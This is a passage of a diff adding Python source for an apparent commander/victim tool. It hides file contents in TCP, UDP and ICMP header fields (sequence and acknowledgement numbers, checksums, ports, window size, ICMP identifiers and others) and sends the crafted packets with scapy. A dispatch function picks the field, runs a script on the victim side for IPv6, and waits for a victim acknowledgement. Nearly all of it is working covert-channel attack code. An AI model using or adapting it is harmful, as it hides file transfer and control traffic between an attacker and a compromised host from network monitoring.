+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        sequence_num = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, seq=sequence_num)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_ack_num(client_sock: socket.socket,
+                              dest_ip: str,
+                              dest_port: int,
+                              src_port: int,
+                              file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    acknowledgement number field.
+
+    @note Bit length
+        The acknowledgement number field for TCP headers is 32 bits (4 Bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 32):
+        binary_segment = binary_data[i:i + 32].ljust(32, '0')
+        ack_num = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, ack=ack_num)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_data_offset(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  src_port: int,
+                                  file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    data-offset field.
+
+    This is also known as the header
+    length that indicates the length of the TCP header
+    and specifies where the data portion starts.
+
+    @note Bit length
+        The data offset field for TCP headers is 4 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 4):
+        binary_segment = binary_data[i:i + 4].ljust(4, '0')
+        data_offset = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, dataofs=data_offset)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_reserved(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    reserved field.
+
+    @note Bit length
+        The reserved field for TCP headers is 3 bits
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 3):
+        binary_segment = binary_data[i:i + 3].ljust(3, '0')
+        reserved_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, reserved=reserved_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_flags(client_sock: socket.socket,
+                            dest_ip: str,
+                            dest_port: int,
+                            src_port: int,
+                            file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    various control flag fields.
+
+    @attention The recipient may not be able to recover the original data due to
+               various flags being set
+
+    @note Bit length
+        The control flags field for TCP headers is 9 bits for the different
+        flags (ECN, ACK, SYN, FIN, etc.)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 9):  # 3 bit chunks
+        binary_segment = binary_data[i:i + 9].ljust(9, '0')
+        flag_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, flags=flag_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_window_size(client_sock: socket.socket,
+                                  dest_ip: str,
+                                  dest_port: int,
+                                  src_port: int,
+                                  file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    window size field.
+
+    @note Bit length
+        The window size field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        window_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, window=window_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_chksum(client_sock: socket.socket,
+                             dest_ip: str,
+                             dest_port: int,
+                             src_port: int,
+                             file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    checksum field.
+
+    @note Bit length
+        The checksum field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        chksum_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, chksum=chksum_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
+                                 dest_ip: str,
+                                 dest_port: int,
+                                 src_port: int,
+                                 file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    urgent pointer field.
+
+    @note Bit length
+        The urgent pointer field for TCP headers is 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        urg_ptr_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port, dport=dest_port, urgptr=urg_ptr_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_tcp_options(client_sock: socket.socket,
+                              dest_ip: str,
+                              dest_port: int,
+                              src_port: int,
+                              file_path: str):
+    """
+    Hides file data covertly in TCP headers using the
+    TimeStamp options field.
+
+    @note Bit length
+        - The options field for TCP headers is maximum 320 bits (40 bytes)
+        - 16 bits chosen here for TimeStamp option (can be reduced for more covertness)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        timestamp_val = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / TCP(sport=src_port,
+                                       dport=dest_port,
+                                       options=[(constants.TIMESTAMP, (timestamp_val, 0))])  # (ts_val, ts_echo)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+# ===================== UDP HEADER COVERT DATA FUNCTIONS =====================
+
+
+def transfer_file_udp_src_port(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in UDP headers using the
+    source port field.
+
+    @note Bit length
+        The source port field for UDP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        new_src_port = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / UDP(sport=new_src_port, dport=dest_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_udp_dst_port(client_sock: socket.socket,
+                               dest_ip: str,
+                               dest_port: int,
+                               src_port: int,
+                               file_path: str):
+    """
+    Hides file data covertly in UDP headers using the
+    destination port field.
+
+    @note Bit length
+        The destination port field for UDP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        new_dst_port = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=new_dst_port)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_udp_length(client_sock: socket.socket,
+                             dest_ip: str,
+                             dest_port: int,
+                             src_port: int,
+                             file_path: str):
+    """
+    Hides file data covertly in UDP headers using the
+    length field.
+
+    @note Bit length
+        The length field for UDP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        length = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, len=length)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_udp_chksum(client_sock: socket.socket,
+                             dest_ip: str,
+                             dest_port: int,
+                             src_port: int,
+                             file_path: str):
+    """
+    Hides file data covertly in UDP headers using the
+    checksum field.
+
+    @note Bit length
+        The checksum field for UDP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param dest_port:
+        A string representing the destination port
+
+    @param src_port:
+        A string representing the commander's port
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        chksum_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / UDP(sport=src_port, dport=dest_port, chksum=chksum_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+# ===================== ICMP HEADER COVERT DATA FUNCTIONS =====================
+
+
+def transfer_file_icmp_type(client_sock: socket.socket,
+                            dest_ip: str,
+                            file_path: str):
+    """
+    Hides file data covertly in ICMP headers using the
+    type field.
+
+    @note Bit length
+        The type field for ICMP headers is maximum 8 bits (1 byte)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):  # 8 bit chunks
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        type_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / ICMP(type=type_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_icmp_code(client_sock: socket.socket,
+                            dest_ip: str,
+                            file_path: str):
+    """
+    Hides file data covertly in ICMP headers using the
+    code field.
+
+    @note Bit length
+        The code field for ICMP headers is maximum 8 bits (1 byte)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 8):  # 8 bit chunks
+        binary_segment = binary_data[i:i + 8].ljust(8, '0')
+        code_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / ICMP(code=code_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_icmp_chksum(client_sock: socket.socket,
+                              dest_ip: str,
+                              file_path: str):
+    """
+    Hides file data covertly in ICMP headers using the
+    checksum field.
+
+    @note Bit length
+        The checksum field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        chksum_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / ICMP(chksum=chksum_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_icmp_identification(client_sock: socket.socket,
+                                      dest_ip: str,
+                                      file_path: str):
+    """
+    Hides file data covertly in ICMP headers using the
+    identification field.
+
+    @note Bit length
+        The identification field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        id_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / ICMP(id=id_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def transfer_file_icmp_seq_num(client_sock: socket.socket,
+                               dest_ip: str,
+                               file_path: str):
+    """
+    Hides file data covertly in ICMP headers using the
+    sequence number field.
+
+    @note Bit length
+        The sequence number field for ICMP headers is maximum 16 bits (2 bytes)
+
+    @param client_sock:
+        A socket representing the client socket
+
+    @param dest_ip:
+        A string representing the destination IP
+
+    @param file_path:
+        A string representing the path of the file
+
+    @return: None
+    """
+    # a) Read the content of the file
+    with open(file_path, constants.READ_BINARY_MODE) as file:
+        file_content = file.read()
+
+    # b) Convert file content to binary
+    binary_data = __bytes_to_bin(file_content)
+
+    # c) Put data in packet
+    packets = []
+    for i in range(0, len(binary_data), 16):  # 16 bit chunks
+        binary_segment = binary_data[i:i + 16].ljust(16, '0')
+        seq_num_data = int(binary_segment, 2)
+        packet = IP(dst=dest_ip) / ICMP(seq=seq_num_data)
+        packets.append(packet)
+
+    # d) Send total number of packets to the client
+    total_packets = str(len(packets))
+    client_sock.send(total_packets.encode())
+
+    # e) Introduce delay to allow scapy to synchronize between send/sniff calls
+    time.sleep(1)
+
+    # f) Send packets
+    for packet in packets:
+        send(packet, verbose=0)
+
+
+def __get_protocol_header_transfer_function_map():
+    return {  # A tuple of [Header, Field] => Function
+        # a) IPv4 Handlers
+        ("IPv4", "Version"): transfer_file_ipv4_version,
+        ("IPv4", "IHL (Internet Header Length)"): transfer_file_ipv4_ihl,
+        ("IPv4", "DS (Differentiated Services Codepoint)"): transfer_file_ipv4_ds,
+        ("IPv4", "Explicit Congestion Notification (ECN)"): transfer_file_ipv4_ecn,
+        ("IPv4", "Total Length"): transfer_file_ipv4_total_length,
+        ("IPv4", "Identification"): transfer_file_ipv4_identification,
+        ("IPv4", "Flags"): transfer_file_ipv4_flags,
+        ("IPv4", "Fragment Offset"): transfer_file_ipv4_frag_offset,
+        ("IPv4", "TTL (Time to Live)"): transfer_file_ipv4_ttl,
+        ("IPv4", "Protocol"): transfer_file_ipv4_protocol,
+        ("IPv4", "Header Checksum"): transfer_file_ipv4_header_chksum,
+        ("IPv4", "Source Address"): transfer_file_ipv4_src_addr,
+        ("IPv4", "Destination Address"): transfer_file_ipv4_dst_addr,
+
+        # b) IPv6 Handlers
+        ("IPv6", "Version"): transfer_file_ipv6_version,
+        ("IPv6", "Traffic Class"): transfer_file_ipv6_traffic_class,
+        ("IPv6", "Flow Label"): transfer_file_ipv6_flow_label,
+        ("IPv6", "Payload Length"): transfer_file_ipv6_payload_length,
+        ("IPv6", "Next Header"): transfer_file_ipv6_next_header,
+        ("IPv6", "Hop Limit"): transfer_file_ipv6_hop_limit,
+        ("IPv6", "Source Address"): transfer_file_ipv6_src_addr,
+        ("IPv6", "Destination Address"): transfer_file_ipv6_dest_addr,
+
+        # c) TCP Handlers
+        ("TCP", "Source Port"): transfer_file_tcp_src_port,
+        ("TCP", "Destination Port"): transfer_file_tcp_dst_port,
+        ("TCP", "Sequence Number"): transfer_file_tcp_seq_num,
+        ("TCP", "Acknowledgement Number"): transfer_file_tcp_ack_num,
+        ("TCP", "Data Offset"): transfer_file_tcp_data_offset,
+        ("TCP", "Reserved"): transfer_file_tcp_reserved,
+        ("TCP", "Flags"): transfer_file_tcp_flags,
+        ("TCP", "Window Size"): transfer_file_tcp_window_size,
+        ("TCP", "Checksum"): transfer_file_tcp_chksum,
+        ("TCP", "Urgent Pointer"): transfer_file_tcp_urgent_ptr,
+        ("TCP", "Options"): transfer_file_tcp_options,
+
+        # d) UDP Handlers
+        ("UDP", "Source Port"): transfer_file_udp_src_port,
+        ("UDP", "Destination Port"): transfer_file_udp_dst_port,
+        ("UDP", "Length"): transfer_file_udp_length,
+        ("UDP", "Checksum"): transfer_file_udp_chksum,
+
+        # e) ICMP Handlers
+        ("ICMP", "Type (Type of Message)"): transfer_file_icmp_type,
+        ("ICMP", "Code"): transfer_file_icmp_code,
+        ("ICMP", "Checksum"): transfer_file_icmp_chksum,
+        ("ICMP", "Identifier"): transfer_file_icmp_identification,
+        ("ICMP", "Sequence Number"): transfer_file_icmp_seq_num,
+    }
+
+
+def transfer_file_covert(sock: socket.socket, dest_ip: str,
+                         dest_port: int, source_port: int,
+                         choices: tuple, file_path: str):
+    # Initialize map
+    header_field_function_map = __get_protocol_header_transfer_function_map()
+
+    # Find the choice(header/field) in map, get and call the mapped function
+    if choices in header_field_function_map:
+        selected_function = header_field_function_map.get(choices)
+
+        # DIFFERENT HANDLERS: IPv4
+        if constants.IPV4 in choices:
+            if constants.SOURCE_ADDRESS_FIELD in choices:
+                selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+            elif selected_function is not None and callable(selected_function):
+                selected_function(sock, dest_ip, file_path)
+
+        # DIFFERENT HANDLERS: IPv6
+        elif constants.IPV6 in choices:
+            if constants.DESTINATION_ADDRESS_FIELD in choices:
+                __transfer_file_dst_addr_error_handler(choices[1], choices[0])
+                return None
+
+            # Receive file, execute script and send IPv6 to commander for sniff (DON'T RETURN ANYTHING)
+            receive_get_ipv6_script(sock, dest_ip, dest_port)
+
+            # Get IPv6 address and port from commander
+            cmdr_ipv6_addr, cmdr_ipv6_port = sock.recv(1024).decode().split("/")
+            selected_function(sock, cmdr_ipv6_addr, cmdr_ipv6_port, file_path)
+
+        # DIFFERENT HANDLERS: TCP or UDP
+        elif constants.TCP in choices or constants.UDP in choices:
+            selected_function(sock, dest_ip, dest_port, source_port, file_path)
+
+        # DIFFERENT HANDLERS: ICMP
+        elif constants.ICMP in choices:
+            selected_function(sock, dest_ip, file_path)
+
+        else:
+            print(constants.CALL_MAP_FUNCTION_ERROR)
+            return None
+    else:
+        print(constants.CHOICES_NOT_FOUND_IN_MAP_ERROR)
+        return None
+
+    # Get an ACK from the victim for success
+    transfer_result = sock.recv(1024).decode()
+
+    if transfer_result == constants.VICTIM_ACK:
+        print(constants.FILE_TRANSFER_SUCCESSFUL.format(file_path,
+                                                        dest_ip,
+                                                        dest_port))
+    else:
+        print(constants.FILE_TRANSFER_ERROR.format(transfer_result))
